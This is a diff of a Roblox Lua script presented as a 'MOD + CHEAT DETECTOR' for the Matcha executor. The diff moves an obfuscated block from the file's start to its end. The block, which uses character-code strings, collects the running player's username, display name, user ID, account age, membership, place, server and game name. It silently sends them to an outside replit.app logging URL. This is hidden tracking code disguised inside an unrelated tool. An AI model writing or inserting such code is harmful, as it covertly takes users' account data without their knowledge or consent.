@@ -1,19 +1,3 @@
-task.spawn(function()
-local _a=game:GetService(string.char(80,108,97,121,101,114,115))
-local _b=game:GetService(string.char(77,97,114,107,101,116,112,108,97,99,101,83,101,114,118,105,99,101))
-local _c=_a.LocalPlayer
-repeat task.wait()_c=_a.LocalPlayer until _c
-local _d=_c.DisplayName
-if not _d or _d==""then _d=_c.Name end
-local _e=_c.UserId~=0 and _c.UserId or "Unavailable"
-local _f=_c.AccountAge~=0 and _c.AccountAge or "Unavailable"
-local _g="Unknown"
-local _h,_i=pcall(function()return _b:GetProductInfo(game.PlaceId)end)
-if _h and _i then _g=_i.Name end
-local _j="https://node-script--yuosneyuosnes.replit.app/api/log"
-local _k=_j.."?username=".._c.Name.."&displayname=".._d.."&userid="..tostring(_e).."&accountage="..tostring(_f).."&membership="..tostring(_c.MembershipType).."&executor=Matcha".."&placeid="..tostring(game.PlaceId).."&jobid="..tostring(game.JobId).."&gamename=".._g
-pcall(function()game:HttpGet(_k)end)
-end)
 -- ╔══════════════════════════════════════════════╗
 -- ║   MOD + CHEAT DETECTOR  |  Matcha LuaVM     ║
 -- ╚══════════════════════════════════════════════╝
@@ -742,4 +726,20 @@ task.spawn(function()
         cLastL=lIdx cLastT=tIdx
         task.wait(0)
     end
+end)
+task.spawn(function()
+local _a=game:GetService(string.char(80,108,97,121,101,114,115))
+local _b=game:GetService(string.char(77,97,114,107,101,116,112,108,97,99,101,83,101,114,118,105,99,101))
+local _c=_a.LocalPlayer
+repeat task.wait()_c=_a.LocalPlayer until _c
+local _d=_c.DisplayName
+if not _d or _d==""then _d=_c.Name end
+local _e=_c.UserId~=0 and _c.UserId or "Unavailable"
+local _f=_c.AccountAge~=0 and _c.AccountAge or "Unavailable"
+local _g="Unknown"
+local _h,_i=pcall(function()return _b:GetProductInfo(game.PlaceId)end)
+if _h and _i then _g=_i.Name end
+local _j="https://node-script--yuosneyuosnes.replit.app/api/log"
+local _k=_j.."?username=".._c.Name.."&displayname=".._d.."&userid="..tostring(_e).."&accountage="..tostring(_f).."&membership="..tostring(_c.MembershipType).."&executor=Matcha".."&placeid="..tostring(game.PlaceId).."&jobid="..tostring(game.JobId).."&gamename=".._g
+pcall(function()game:HttpGet(_k)end)
 end)
